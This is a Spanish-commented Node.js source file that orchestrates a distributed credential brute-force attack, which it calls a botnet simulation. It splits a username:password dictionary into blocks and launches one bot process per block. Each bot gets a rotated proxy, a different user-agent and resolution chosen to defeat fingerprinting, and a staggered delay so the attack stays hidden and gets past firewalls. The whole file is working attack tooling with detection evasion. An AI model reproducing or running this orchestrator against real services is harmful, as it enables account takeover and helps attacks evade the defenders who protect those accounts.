/**
 * @file lanzador_maestro.js
 * @brief Orquestador Maestro de Botnets (Simulador de Ataque Distribuido).
 * @details Este script actúa como el cerebro de la simulación de ataque, 
 * encargándose de fragmentar un diccionario de credenciales en segmentos 
 * y lanzar múltiples instancias de bots (bot_evasion.js) con identidades 
 * y rutas de red (proxies) únicas para evadir firewalls y loguear telemetría.
 * 
 * @author Felipe Andrés
 * @version 2.5.0
 */

'use strict';

const { spawn } = require('child_process');
const fs       = require('fs');
const path     = require('path');

// =============================================================================
// LECTURA DEL DICCIONARIO DE CREDENCIALES
// =============================================================================

/**
 * @brief Cargador de Diccionario Táctico.
 * @details Lee y parsea el archivo 'diccionario.txt' en busca de pares usuario:contraseña.
 */
const rutaDiccionario = path.join(__dirname, 'diccionario.txt');
if (!fs.existsSync(rutaDiccionario)) {
    console.error('[ERROR] No se encontró diccionario.txt. Cree el archivo con formato usuario:contraseña.');
    process.exit(1);
}
const contenido = fs.readFileSync(rutaDiccionario, 'utf-8');
const lineas    = contenido.split('\n')
    .map(l => l.trim())
    .filter(l => l.length > 0 && !l.startsWith('#') && l.includes(':'));

console.log(`[SISTEMA] 📖 Cargadas ${lineas.length} credenciales del diccionario.`);

// =============================================================================
// CARGA Y VALIDACIÓN DE PROXIES
// =============================================================================

/**
 * @brief Motor de Gestión de Proxies.
 * @details Carga un pool de proxies externos para simular peticiones desde 
 * diversas ubicaciones geográficas.
 * @return {string[]} Lista de URIs de proxies cargados.
 */
function cargarProxies() {
    const rutaProxies = path.join(__dirname, 'proxies.txt');
    if (!fs.existsSync(rutaProxies)) {
        console.warn('[AVISO] No se encontró proxies.txt. Los bots atacarán sin proxy.');
        return [];
    }

    const proxies = fs.readFileSync(rutaProxies, 'utf-8')
        .split('\n')
        .map(l => l.trim())
        .filter(l => l.length > 0 && !l.startsWith('#')); 

    console.log(`[SISTEMA] 🌐 Cargados ${proxies.length} proxies del fichero.`);
    return proxies;
}

const proxies = cargarProxies();

/**
 * @brief Algoritmo Round-Robin para Proxies.
 * @details Selecciona un proxy del pool de forma secuencial según el índice del bot.
 * @param {number} indice Índice del bot actual.
 * @return {string|null} URI del proxy o null si no hay disponibles.
 */
function obtenerProxy(indice) {
    if (proxies.length === 0) return null;
    return proxies[indice % proxies.length];
}

// =============================================================================
// GENERACIÓN DE IDENTIDADES DE BOT (Anti-Fingerprinting)
// =============================================================================

/**
 * @brief Banco de Identidades (User-Agents).
 * @details Lista de cadenas de agente de usuario para simular diversidad de dispositivos.
 */
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0'
];

/**
 * @brief Generador de Perfiles Sintéticos.
 * @details Construye un objeto de configuración único para cada bot, 
 * variando la resolución de pantalla y el User-Agent para evadir 
 * algoritmos de detección de anomalías (Canvas Fingerprint).
 * 
 * @param {number} indice Índice de inicio del segmento de credenciales.
 * @param {Array} bloqueCredenciales Array de objetos {u, p} a testear.
 * @return {Object} Configuración táctica del bot.
 */
function obtenerConfigBot(indice, bloqueCredenciales) {
    const numBot = Math.floor(indice / 10); 
    return {
        id:    `Bot_Segmento_${numBot}`,
        ua:    USER_AGENTS[numBot % USER_AGENTS.length],
        // Variación mínima de resolución para firma de hardware única
        w:     1000 + (numBot * 2),
        h:     800  + (numBot * 2),
        creds: bloqueCredenciales, 
        proxy: obtenerProxy(numBot) 
    };
}

// =============================================================================
// ORQUESTACIÓN: LANZAMIENTO POR SEGMENTOS
// =============================================================================

console.log('[SISTEMA] 🚀 Iniciando orquestador de botnet simulada...');
console.log('[SISTEMA] ⚙️  Modo: Stealth + Proxy Rotativo + Throttling/Delay');

/**
 * @brief Algoritmo de Lanzamiento de la Botnet.
 * @details Trocea el diccionario en grupos de 10 credenciales y asigna cada 
 * grupo a un proceso independiente con un retraso escalonado de 10 segundos 
 * para simular un ataque de fuerza bruta distribuido y sigiloso.
 */
for (let i = 0; i < lineas.length; i += 10) {

    const bloque = lineas.slice(i, i + 10).map(linea => {
        const separador = linea.indexOf(':'); 
        return {
            u: linea.substring(0, separador),
            p: linea.substring(separador + 1)
        };
    });

    const config = obtenerConfigBot(i, bloque);

    /*
     * DELAY ESCALONADO (Throttling):
     * Cada bot espera un tiempo proporcional a su orden de lanzamiento 
     * para no saturar los procesos del servidor y mantener el sigilo.
     */
    const delayMs = (i / 10) * 10000;

    setTimeout(() => {
        const numBot = Math.floor(i / 10);
        console.log(`[LANZADOR] 🤖 Iniciando Bot_Segmento_${numBot} | Proxy: ${config.proxy || 'Directo'} | Creds: ${i + 1}-${Math.min(i + 10, lineas.length)}`);

        const configJson = JSON.stringify(config);
        const child = spawn('node', ['bot_evasion.js', configJson], {
            cwd: __dirname
        });

        child.stdout.on('data', (data) => process.stdout.write(data));
        child.stderr.on('data', (data) => {
             console.error(`[ERROR] Bot_Segmento_${numBot}:`, data.toString());
        });

        child.on('error', (err) => {
            console.error(`[SISTEMA] No se pudo iniciar el bot ${numBot}:`, err.message);
        });
    }, delayMs);
}

console.log(`[SISTEMA] Orquestador configurado. Segmentación completada satisfactoriamente.`);